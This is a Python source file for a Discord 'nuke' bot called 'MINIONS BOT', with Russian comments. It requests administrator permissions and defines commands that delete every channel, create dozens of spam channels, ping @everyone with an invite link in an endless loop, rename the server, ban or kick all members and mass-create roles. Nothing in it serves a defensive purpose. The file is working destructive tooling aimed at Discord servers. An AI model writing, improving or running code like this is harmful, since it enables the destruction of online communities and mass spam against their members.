import discord
from discord.ext import commands
import asyncio
import aiohttp
import random
import os
from dotenv import load_dotenv

# Загружаем переменные из .env файла
load_dotenv()

# Настройки бота
intents = discord.Intents.all()
intents.messages = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

# Токен бота из .env файла
TOKEN = os.getenv('DISCORD_TOKEN')

@bot.event
async def on_ready():
    print(f'Бот {bot.user.name} готов к работе!')
    print(f'Пригласительная ссылка: https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot')
    await bot.change_presence(activity=discord.Game(name="!nuke | MINIONS"))

@bot.command()
async def nuke(ctx):
    """Уничтожение сервера"""
    try:
        # Удаление всех каналов
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                print(f"Удален канал: {channel.name}")
            except:
                continue
        
        # Создание новых каналов с названием MINIONS
        for i in range(50):
            try:
                channel = await ctx.guild.create_text_channel(f"MINIONS-{i+1}")
                # Спам сообщениями в каждом канале
                for j in range(10):
                    await channel.send("@everyone Minions join how To Get Bot>>>> https://discord.gg/GTKjv36M")
                    await asyncio.sleep(0.5)
            except:
                continue
        
        # Изменение названия сервера
        try:
            await ctx.guild.edit(name="MINIONS SERVER")
        except:
            pass
            
        # Массовый спам во всех каналах
        while True:
            for channel in ctx.guild.text_channels:
                try:
                    await channel.send("@everyone **MINIONS ATTACK** https://discord.gg/GTKjv36M 🚀🚀🚀")
                except:
                    continue
            await asyncio.sleep(1)
            
    except Exception as e:
        print(f"Ошибка: {e}")

@bot.command()
async def spam(ctx, amount: int = 100):
    """Спам сообщениями"""
    for i in range(amount):
        try:
            await ctx.send(f"@everyone Minions join #{i+1} https://discord.gg/GTKjv36M 🟡")
            await asyncio.sleep(0.3)
        except:
            continue

@bot.command()
async def banall(ctx):
    """Банит всех участников"""
    for member in ctx.guild.members:
        try:
            if member != ctx.author and member != bot.user:
                await member.ban()
                print(f"Забанен: {member.name}")
        except:
            continue

@bot.command()
async def kickall(ctx):
    """Кикает всех участников"""
    for member in ctx.guild.members:
        try:
            if member != ctx.author and member != bot.user:
                await member.kick()
                print(f"Кикнут: {member.name}")
        except:
            continue

@bot.command()
async def rolespam(ctx):
    """Создает много ролей"""
    for i in range(100):
        try:
            await ctx.guild.create_role(name=f"MINION-{i+1}")
        except:
            continue

@bot.command()
async def help(ctx):
    """Помощь по командам"""
    embed = discord.Embed(title="MINIONS BOT HELP", color=0xffd700)
    embed.add_field(name="!nuke", value="Полное уничтожение сервера", inline=False)
    embed.add_field(name="!spam [количество]", value="Спам сообщениями", inline=False)
    embed.add_field(name="!banall", value="Бан всех участников", inline=False)
    embed.add_field(name="!kickall", value="Кик всех участников", inline=False)
    embed.add_field(name="!rolespam", value="Создание множества ролей", inline=False)
    embed.set_footer(text="MINIONS BOT | https://discord.gg/GTKjv36M")
    
    await ctx.send(embed=embed)

# Слэш команды
@bot.tree.command(name="nuke", description="Уничтожение сервера")
async def slash_nuke(interaction: discord.Interaction):
    await interaction.response.send_message("🚀 Запуск Nuke...")
    ctx = await bot.get_context(interaction.message)
    await nuke(ctx)

@bot.tree.command(name="spam", description="Спам сообщениями")
async def slash_spam(interaction: discord.Interaction, amount: int = 100):
    await interaction.response.send_message(f"📢 Спам {amount} сообщений...")
    ctx = await bot.get_context(interaction.message)
    await spam(ctx, amount)

@bot.tree.command(name="banall", description="Бан всех участников")
async def slash_banall(interaction: discord.Interaction):
    await interaction.response.send_message("🔨 Бан всех участников...")
    ctx = await bot.get_context(interaction.message)
    await banall(ctx)

@bot.tree.command(name="help", description="Помощь по командам")
async def slash_help(interaction: discord.Interaction):
    ctx = await bot.get_context(interaction.message)
    await help(ctx)

# Запуск бота
if __name__ == "__main__":
    # Проверка токена
    if not TOKEN:
        print("ОШИБКА: Токен не найден! Создайте .env файл с DISCORD_TOKEN=ваш_токен")
        exit(1)
    
    # Синхронизация слэш команд
    @bot.event
    async def on_connect():
        await bot.tree.sync()
    
    bot.run(TOKEN)
